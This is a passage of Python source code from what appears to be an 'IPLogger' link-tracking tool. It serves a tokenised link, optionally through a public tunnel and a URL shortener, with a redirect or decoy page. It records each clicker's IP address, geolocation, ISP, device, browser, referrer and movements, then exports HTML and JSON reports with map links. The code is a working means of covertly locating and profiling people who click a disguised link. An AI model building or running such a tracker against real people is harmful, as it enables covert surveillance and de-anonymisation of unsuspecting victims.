    def save_report(self) -> Dict[str, Optional[Path]]:
        """Export captures to standalone HTML + JSON report."""
        if not self.captures:
            return {"html": None, "json": None}
        humans = [c for c in self.captures if not c.get("is_bot")]
        bots = [c for c in self.captures if c.get("is_bot")]
        summary = {
            "token": self.token,
            "generated": datetime.now().isoformat(),
            "total_hits": len(self.captures),
            "human_hits": len(humans),
            "bot_hits": len(bots),
            "unique_ips": sorted({c["ip"] for c in self.captures if c.get("ip")}),
        }
        visitors = []
        for vid, vis in self._visitors.items():
            visitors.append({
                "visitor_id": vid,
                "first_seen": vis.get("first_seen"),
                "last_seen": datetime.fromtimestamp(vis.get("last_ts", 0)).isoformat() if vis.get("last_ts") else None,
                "left": bool(vis.get("left")),
                "hits": vis.get("hits", 0),
                "last_ip": vis.get("last_ip"),
                "movements": vis.get("movements", []),
            })
        summary["visitors"] = visitors
        report = {"summary": summary, "captures": self.captures}

        base = self.output_dir / f"report_{self.token}"
        json_path: Optional[Path] = base.with_suffix(".json")
        html_path: Optional[Path] = base.with_suffix(".html")
        try:
            json_path.write_text(
                json.dumps(report, indent=2, ensure_ascii=False, default=str),
                encoding="utf-8",
            )
        except Exception:
            json_path = None
        try:
            html_path.write_text(self._render_html(summary), encoding="utf-8")
        except Exception:
            html_path = None
        return {"html": html_path, "json": json_path}

    def _render_html(self, summary: Dict) -> str:
        esc = html.escape
        rows = []
        for c in reversed(self.captures):
            g = c.get("geo") or {}
            loc = esc(" · ".join(x for x in (g.get("city"), g.get("region"), g.get("country")) if x) or "—")
            isp = esc(g.get("isp") or g.get("org") or "")
            map_link = g.get("map_url", "")
            flags = []
            if c.get("is_bot"):
                flags.append(f"BOT: {esc(c.get('bot_name') or 'crawler')}")
            if g.get("is_proxy"):
                flags.append("VPN/Proxy")
            if g.get("is_hosting"):
                flags.append("hosting/datacenter")
            badge = "bot" if c.get("is_bot") else "human"
            ip = esc(str(c.get("ip", "")))
            meta = f'<div class="cap-meta">device: {esc(str(c.get("device")))} · {esc(str(c.get("os")))} · {esc(str(c.get("browser")))}</div>'
            meta += f'<div class="cap-meta">geo: {loc}{" · ISP " + isp if isp else ""}</div>'
            if flags:
                meta += f'<div class="cap-meta">flags: {", ".join(flags)}</div>'
            if map_link:
                meta += f'<div class="cap-meta"><a href="{esc(map_link)}" target="_blank" rel="noopener">📍 buka peta</a></div>'
            if c.get("referrer"):
                meta += f'<div class="cap-meta">referer: {esc(str(c["referrer"])[:120])}</div>'
            rows.append(
                f'<div class="cap {badge}">'
                f'<div class="cap-head"><span class="ip">{ip}</span>'
                f'<span class="time">{esc(str(c["timestamp"])[:19])}</span>'
                f'<span class="badge {badge}">{"BOT" if c.get("is_bot") else "HUMAN"}</span></div>'
                f'{meta}</div>'
            )
        page = REPORT_TEMPLATE
        page = page.replace("$TOKEN", esc(str(summary["token"])))
        page = page.replace("$TOTAL", str(summary["total_hits"]))
        page = page.replace("$HUMANS", str(summary["human_hits"]))
        page = page.replace("$BOTS", str(summary["bot_hits"]))
        page = page.replace("$UNIQUE", str(len(summary["unique_ips"])))
        page = page.replace("$GENERATED", esc(str(summary["generated"])[:19]))
        page = page.replace("$ROWS", "".join(rows))
        return page


async def run_ip_logger(
    port: int = 8080,
    redirect_url: Optional[str] = None,
    page_html: Optional[str] = None,
    pixel: bool = False,
    live: bool = False,
    shorten: bool = True,
    public_tunnel: bool = True,
    output_dir: Path = DEFAULT_OUTPUT_DIR,
) -> Dict[str, str]:
    """Convenience wrapper: build + run an IPLogger."""
    logger = IPLogger(port=port, redirect_url=redirect_url, page_html=page_html,
                      pixel=pixel, live=live, shorten=shorten, output_dir=output_dir)
    return await logger.run(public_tunnel=public_tunnel)


def start_iplogger_server(
    port: int = 8080,
    redirect_url: Optional[str] = None,
    live: bool = True,
    public_tunnel: bool = False,
    shorten: bool = True,
    output_dir: Path = DEFAULT_OUTPUT_DIR,
) -> Dict:
    """Run an IPLogger inside a background thread (for the web UI).

    Returns a control dict:
      {"thread", "logger", "links", "ready", "error", "stop"}
    Caller sets ctrl["stop"] = True to shut it down gracefully.
    """
    import threading

    ctrl: Dict = {
        "thread": None, "logger": None, "links": {},
        "ready": False, "error": None, "stop": False,
    }

    def _run():
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        try:
            logger = IPLogger(port=port, redirect_url=redirect_url, live=live,
                              shorten=False, output_dir=output_dir)
            ctrl["logger"] = logger

            async def _serve():
                runner = web.AppRunner(logger.app)
                await runner.setup()
                site = web.TCPSite(runner, "0.0.0.0", port)
                await site.start()
                ctrl["links"]["local"] = f"http://localhost:{port}/g/{logger.token}"
                if public_tunnel:
                    proc, pub, name = await logger._start_tunnel()
                    if pub:
                        public_url = f"{(pub or '').rstrip('/')}/g/{logger.token}"
                        ctrl["links"]["public"] = public_url
                        ctrl["links"]["provider"] = name
                        if shorten:
                            short = await shorten_url(public_url)
                            if short:
                                ctrl["links"]["short"] = short
                ctrl["ready"] = True
                while not ctrl["stop"]:
                    await asyncio.sleep(0.5)
                await runner.cleanup()
                await logger._stop_tunnel()

            loop.run_until_complete(_serve())
        except Exception as e:
            ctrl["error"] = str(e)
        finally:
            try:
                loop.close()
            except Exception:
                pass

    ctrl["thread"] = threading.Thread(target=_run, daemon=True)
    ctrl["thread"].start()
    return ctrl
